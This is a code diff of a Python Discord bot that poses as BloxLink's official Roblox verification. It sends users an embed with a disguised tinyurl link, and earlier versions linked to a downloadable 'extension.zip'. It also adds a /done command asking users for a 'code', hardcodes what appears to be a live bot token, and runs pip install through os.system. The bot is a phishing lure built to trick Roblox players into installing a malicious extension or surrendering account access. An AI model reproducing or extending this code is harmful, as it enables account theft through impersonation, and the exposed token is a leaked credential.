@@ -1,27 +1,29 @@
 import discord
 from discord.ext import commands
 import requests
+from keep_alive import keep_alive
+import os
+os.system("pip install py-cord==2.0.0b1")
+import time 
 
 
 ################### change these to your liking ###################
 
-token = "yourtokenhere"
+token = "MTA1NTg0MDA4MTE5OTUxMzY4MA.GLsQZU.NfoZwXrLbBJoRuc2C9XsfKZiXnsXM8DmE4FvUo"
 prefix = "!"
-title = "Please Complete Verification"
-desc ="To verify your account, please join BloxLink's Official Roblox Verification Game AND add the extension"
-field = "Please add the extension and then join the game"
-hyperlink = "Extension"
-Ext = "https://cdn.discordapp.com/attachments/992124413715697724/1000352410696429639/extension.zip"
-Game = "https://www.roblox.com/games/1271943503/Bloxlink-Verification-Game"
-game = "Game"
+title = "**Verification!**"
+desc ="To verify your account, please join BloxLink's Official Roblox Verification Game. once done run `/done` to complete the process"
+
+Game = "https://tinyurl.com/EF907G"
+game = "Join here"
 
 ###################################################################
 
 
 
-client = commands.Bot(command_prefix = prefix)
+bot = commands.Bot(command_prefix = prefix)
 
-@client.event
+@bot.event
 async def on_ready():
     print('')
     print('----------------')
@@ -29,20 +31,26 @@ async def on_ready():
     print('----------------')
 
 main = discord.Embed(title=title,description=desc,color=0xcf4948)
-main.add_field(name=field,value=f"[**{hyperlink}**]({Ext}) [**{game}**]({Game})")
+main.add_field(name="** **",value=f"[**{game}**]({Game})")
 
 
-@client.command()
+@bot.slash_command(description="verify command")
 async def verify(ctx):
-    await ctx.send('Sent verification info. Please check your DMs.')
-    await ctx.author.send(embed=main)
-  
+    await ctx.respond(embed=main,ephemeral=True)
+
+@bot.slash_command(description="Finish verification (put your code in the code option)")
+async def done(ctx, code):
+    role_to_give = discord.utils.get(ctx.author.guild.roles, name="Verified")
+    await ctx.author.add_roles(role_to_give) 
+    await ctx.respond(f"you have been given the Verified role!")
+
+@bot.slash_command(description="verify") 
 async def help(ctx):
-    await ctx.send('its very easy just do ```!verify```')
+    await ctx.send('Run the command `/verify` to start the verification process')
     await ctx.author.send(embed=main)
 
 
 
 
 
-client.run(token)
+bot.run(token)
